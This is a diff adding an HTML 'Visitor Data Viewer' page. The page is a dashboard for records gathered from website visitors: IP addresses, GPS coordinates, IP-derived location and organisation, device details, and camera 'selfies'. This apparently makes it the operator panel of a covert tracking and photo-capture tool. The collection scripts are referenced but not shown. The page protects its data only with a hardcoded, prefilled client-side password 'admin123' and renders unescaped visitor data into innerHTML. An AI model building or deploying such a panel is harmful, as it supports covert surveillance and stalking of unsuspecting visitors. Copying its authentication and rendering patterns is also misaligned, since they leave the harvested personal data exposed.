@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Visitor Data Viewer</title>
+    <style>
+        /* ... (keep previous styles) ... */
+        .import-export { background: #e7f3ff; padding: 15px; margin: 10px 0; border-radius: 5px; }
+        .data-actions { display: flex; gap: 10px; margin: 10px 0; }
+        .action-btn { padding: 8px 15px; background: #28a745; color: white; border: none; border-radius: 3px; cursor: pointer; }
+        .action-btn.export { background: #17a2b8; }
+        .action-btn.import { background: #6c757d; }
+        .action-btn.clear { background: #dc3545; }
+        .hidden { display: none; }
+        input[type="file"] { margin: 10px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📊 Visitor Data Viewer (GitHub Version)</h1>
+        
+        <div class="password-section">
+            <input type="password" id="password" placeholder="Enter password" value="admin123">
+            <button onclick="checkPassword()">View Data</button>
+        </div>
+        
+        <div id="content" class="hidden">
+            <div class="import-export">
+                <h3>📁 Data Management</h3>
+                <div class="data-actions">
+                    <button class="action-btn export" onclick="exportData()">Export Data</button>
+                    <button class="action-btn import" onclick="document.getElementById('importFile').click()">Import Data</button>
+                    <button class="action-btn clear" onclick="clearData()">Clear All Data</button>
+                </div>
+                <input type="file" id="importFile" accept=".json" style="display: none;" onchange="importData(this.files[0])">
+                <div id="data-status"></div>
+            </div>
+            
+            <div class="stats" id="stats"></div>
+            <div id="visitors-container"></div>
+        </div>
+    </div>
+
+    <script>
+        const PASSWORD = "admin123";
+
+        function checkPassword() {
+            const password = document.getElementById('password').value;
+            if (password === PASSWORD) {
+                document.getElementById('content').classList.remove('hidden');
+                document.querySelector('.password-section').classList.add('hidden');
+                loadData();
+            } else {
+                alert('Incorrect password!');
+            }
+        }
+
+        function loadData() {
+            const visitors = GitHubFriendlyStorage.getAllLocalData();
+            const container = document.getElementById('visitors-container');
+            const stats = document.getElementById('stats');
+            
+            stats.innerHTML = `📈 Total visitors: ${visitors.length} | 💾 Storage: ${(JSON.stringify(visitors).length / 1024).toFixed(2)} KB`;
+            container.innerHTML = '';
+            
+            if (visitors.length === 0) {
+                container.innerHTML = '<div class="visitor-card"><p>No visitor data found.</p></div>';
+                return;
+            }
+            
+            visitors.forEach(visitor => {
+                const data = visitor.data;
+                const card = document.createElement('div');
+                card.className = 'visitor-card';
+                
+                card.innerHTML = `
+                    <h3>👤 Visitor: ${new Date(data.timestamp).toLocaleString()}</h3>
+                    <p><strong>🌐 IP:</strong> ${data.ip}</p>
+                    <p><strong>📍 Coordinates:</strong> ${data.latitude}, ${data.longitude}</p>
+                    
+                    ${data.ipinfo ? `
+                        <p><strong>🏠 Location:</strong> ${data.ipinfo.city || 'N/A'}, ${data.ipinfo.region || 'N/A'}, ${data.ipinfo.country || 'N/A'}</p>
+                        <p><strong>🏢 Organization:</strong> ${data.ipinfo.org || 'N/A'}</p>
+                    ` : ''}
+                    
+                    <div class="device-info">
+                        <strong>💻 Device Information:</strong>
+                        ${Object.entries(data.device_info || {}).map(([key, value]) => 
+                            `<div><strong>${key}:</strong> ${value}</div>`
+                        ).join('')}
+                    </div>
+                    
+                    ${data.selfies && data.selfies.length > 0 ? `
+                        <strong>📸 Selfies (${data.selfies.length}):</strong>
+                        <div class="selfie-container">
+                            ${data.selfies.map(selfie => 
+                                `<img src="${selfie}" alt="Selfie" onclick="viewFullImage('${selfie}')">`
+                            ).join('')}
+                        </div>
+                    ` : '<p>📷 No selfies captured</p>'}
+                `;
+                
+                container.appendChild(card);
+            });
+        }
+
+        function exportData() {
+            GitHubFriendlyStorage.exportData();
+            showStatus('Data exported successfully!', 'success');
+        }
+
+        async function importData(file) {
+            if (!file) return;
+            
+            const statusElement = document.getElementById('data-status');
+            statusElement.innerHTML = 'Importing data...';
+            
+            const result = await GitHubFriendlyStorage.importData(file);
+            
+            if (result.success) {
+                statusElement.innerHTML = `✅ Successfully imported ${result.count} visitors`;
+                loadData(); // Refresh the view
+            } else {
+                statusElement.innerHTML = `❌ Import failed: ${result.error}`;
+            }
+        }
+
+        function clearData() {
+            if (confirm('Are you sure you want to clear ALL visitor data? This cannot be undone.')) {
+                const visitors = GitHubFriendlyStorage.getAllLocalData();
+                visitors.forEach(visitor => {
+                    localStorage.removeItem(visitor.key);
+                });
+                showStatus('All data cleared!', 'success');
+                loadData();
+            }
+        }
+
+        function viewFullImage(src) {
+            window.open(src, '_blank');
+        }
+
+        function showStatus(message, type) {
+            const statusElement = document.getElementById('data-status');
+            statusElement.innerHTML = message;
+            statusElement.style.color = type === 'success' ? 'green' : 'red';
+        }
+
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') checkPassword();
+        });
+    </script>
+    
+    <script src="scripts/storage.js"></script>
+    <script src="scripts/main.js"></script>
+</body>
+</html>
